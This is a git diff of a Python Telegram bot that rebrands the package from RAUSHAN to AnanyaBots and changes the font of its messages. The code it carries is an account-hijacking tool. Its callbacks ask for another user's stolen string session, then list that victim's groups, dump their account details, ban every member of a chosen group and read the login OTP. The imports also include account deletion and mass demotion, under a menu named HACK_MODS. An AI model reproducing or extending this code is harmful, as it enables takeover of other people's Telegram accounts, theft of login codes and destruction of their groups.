@@ -1,7 +1,7 @@
 import os
-from RAUSHAN import app,API_ID,API_HASH
+from AnanyaBots import app,API_ID,API_HASH
 from pyrogram import filters , Client
-from RAUSHAN.Helpers.steve import (
+from AnanyaBots.Helpers.steve import (
     users_gc,
     user_info,
     banall,
@@ -14,7 +14,7 @@ from RAUSHAN.Helpers.steve import (
     del_acc,
     piromote,
     demote_all)
-from RAUSHAN.Helpers.data import HACK_MODS 
+from AnanyaBots.Helpers.data import HACK_MODS 
 from pyrogram.types import CallbackQuery 
 from pyrogram.raw import functions
 from telethon import TelegramClient 
@@ -25,7 +25,7 @@ from telethon.sessions import StringSession
 @app.on_callback_query(filters.regex("A"))
 async def a_callback(client : Client , query : CallbackQuery):
     chat_id = query.message.chat.id
-    session = await client.ask(chat_id,"𝐍𝐎𝐖 𝐆𝐈𝐕𝐄 𝐌𝐄 𝐓𝐇𝐄 𝐒𝐓𝐑𝐈𝐍𝐆 𝐒𝐄𝐒𝐒𝐈𝐎𝐍 𝐎𝐅 𝐓𝐇𝐀𝐓 𝐔𝐒𝐄𝐑")    
+    session = await client.ask(chat_id,"ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ᴏғ ᴛʜᴀᴛ ᴜsᴇʀ")    
     ch = await users_gc(session.text)
     if len(ch) > 3855:
         file = open("session.txt", "w")
@@ -34,7 +34,7 @@ async def a_callback(client : Client , query : CallbackQuery):
         await client.send_document(chat_id, "session.txt")
         os.system("rm -rf session.txt")
     else:
-        await query.message.reply_text(text = ch + "\n\n**𝐓𝐇𝐀𝐍𝐊𝐒 𝐅𝐎𝐑 𝐔𝐒𝐈𝐍𝐆 𝐌𝐄**",
+        await query.message.reply_text(text = ch + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
             reply_markup=HACK_MODS,
             disable_web_page_preview=True)
 
@@ -42,28 +42,28 @@ async def a_callback(client : Client , query : CallbackQuery):
 @app.on_callback_query(filters.regex("B"))
 async def b_callback(client : Client, query : CallbackQuery):
     id = query.message.chat.id   
-    session = await client.ask(id,"𝐍𝐎𝐖 𝐆𝐈𝐕𝐄 𝐌𝐄 𝐓𝐇𝐄 𝐒𝐓𝐑𝐈𝐍𝐆 𝐒𝐄𝐒𝐒𝐈𝐎𝐍 𝐎𝐅 𝐓𝐇𝐀𝐓 𝐔𝐒𝐄𝐑.")
+    session = await client.ask(id,"ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ᴏғ ᴛʜᴀᴛ ᴜsᴇʀ.")
     info = await user_info(session.text)
-    await query.message.reply_text(text = info + "\n\n**𝐓𝐇𝐀𝐍𝐊𝐒 𝐅𝐎𝐑 𝐔𝐒𝐈𝐍𝐆 𝐌𝐄**",
+    await query.message.reply_text(text = info + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
             reply_markup=HACK_MODS,
             disable_web_page_preview=True)
 
 @app.on_callback_query(filters.regex("C"))
 async def c_callback(client : Client, query : CallbackQuery):
     id = query.message.chat.id   
-    session = await client.ask(id,"𝐍𝐎𝐖 𝐆𝐈𝐕𝐄 𝐌𝐄 𝐓𝐇𝐄 𝐒𝐓𝐑𝐈𝐍𝐆 𝐒𝐄𝐒𝐒𝐈𝐎𝐍 𝐎𝐅 𝐓𝐇𝐀𝐓 𝐔𝐒𝐄𝐑.")
+    session = await client.ask(id,"ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ᴏғ ᴛʜᴀᴛ ᴜsᴇʀ")
     gc = await client.ask(id,"𝐍𝐎𝐖 𝐆𝐈𝐕𝐄 𝐌𝐄 𝐓𝐇𝐄 𝐆𝐑𝐎𝐔𝐏/𝐂𝐇𝐀𝐍𝐍𝐄𝐋 𝐈𝐃 𝐎𝐑 𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄") 
     hehe = await banall(session.text,gc)
-    await query.message.reply_text(text = hehe + "\n\n**𝐓𝐇𝐀𝐍𝐊𝐒 𝐅𝐎𝐑 𝐔𝐒𝐈𝐍𝐆 𝐌𝐄**",
+    await query.message.reply_text(text = hehe + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
             reply_markup=HACK_MODS,
             disable_web_page_preview=True)
 
 @app.on_callback_query(filters.regex("D"))
 async def d_callback(client : Client, query : CallbackQuery):
     id = query.message.chat.id   
-    session = await client.ask(id,"𝐍𝐎𝐖 𝐆𝐈𝐕𝐄 𝐌𝐄 𝐓𝐇𝐄 𝐒𝐓𝐑𝐈𝐍𝐆 𝐒𝐄𝐒𝐒𝐈𝐎𝐍 𝐎𝐅 𝐓𝐇𝐀𝐓 𝐔𝐒𝐄𝐑.")
+    session = await client.ask(id,"ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ᴏғ ᴛʜᴀᴛ ᴜsᴇʀ")
     hehe = await get_otp(session.text)
-    await query.message.reply_text(text = hehe + "\n\n**𝐓𝐇𝐀𝐍𝐊𝐒 𝐅𝐎𝐑 𝐔𝐒𝐈𝐍𝐆 𝐌𝐄**",
+    await query.message.reply_text(text = hehe + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
             reply_markup=HACK_MODS,
             disable_web_page_preview=True)
 
